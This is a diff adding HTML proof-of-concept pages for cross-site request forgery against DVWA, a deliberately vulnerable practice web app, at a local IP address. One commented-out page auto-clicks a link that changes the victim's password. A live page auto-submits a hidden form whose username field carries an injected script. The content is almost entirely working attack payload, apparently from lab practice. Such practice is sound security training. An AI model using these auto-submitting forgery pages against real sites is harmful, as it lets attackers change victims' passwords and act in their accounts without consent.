@@ -1,0 +1,41 @@
+
+<!-- Works for low -->
+
+<!--
+<body onload="document.querySelector('a').click();">
+
+
+<a href="http://192.168.0.105/dvwa/vulnerabilities/csrf/?password_new=termite&password_conf=termite&Change=Change">lol</a>
+
+
+</body> 
+-->
+
+<!-- low -->
+
+
+<!-- Should work for Medium -->
+
+<body onload="document.forms[0].submit();">
+
+	<form method="POST" action="http://192.168.0.105/dvwa/vulnerabilities/csrf/test_credentials.php">
+	
+	<input name="username" value="<a href='http://www.google.com'>lol</a><script>document.querySelector('a').click();</script>" type="hidden">
+
+<!--	<input name="username" value="Admin" type="hidden"> -->
+	
+	<input name="password" value="lol" type="hidden">
+
+	<input name="Login" value="Login" type="hidden">	
+	
+	<input type="submit" >
+
+	</form>
+
+</body>
+
+<!-- medium -->
+
+
+
+
